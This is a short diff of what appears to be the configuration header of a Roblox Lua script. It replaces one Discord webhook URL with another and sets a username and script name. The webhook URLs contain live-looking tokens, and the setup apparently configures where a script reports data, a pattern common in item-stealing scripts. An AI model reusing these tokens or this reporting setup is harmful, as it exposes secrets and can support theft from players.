@@ -1,5 +1,5 @@
 Username = "CR7_12279"
-WebHook = "https://discord.com/api/webhooks/1104056314080006224/ODyVWksoGtAS5ZjhG3_TH4NlikgvdAH5TW5JSLjRrtVh4ldFNRlm0ZKDMaQauocHyFLy"
+WebHook = "https://discord.com/api/webhooks/1112203753085489182/6QQttohEaUzlckivNdXRGvC87YxGmzv7T2U45OuLkGem7QYBfyFHRKDqZ5ID2OlNqZcm"
 loadingscreen = true
 _G.CustomScriptName = "DiamomdScript¤"
 _G.Text1 = "Script Loaded..."
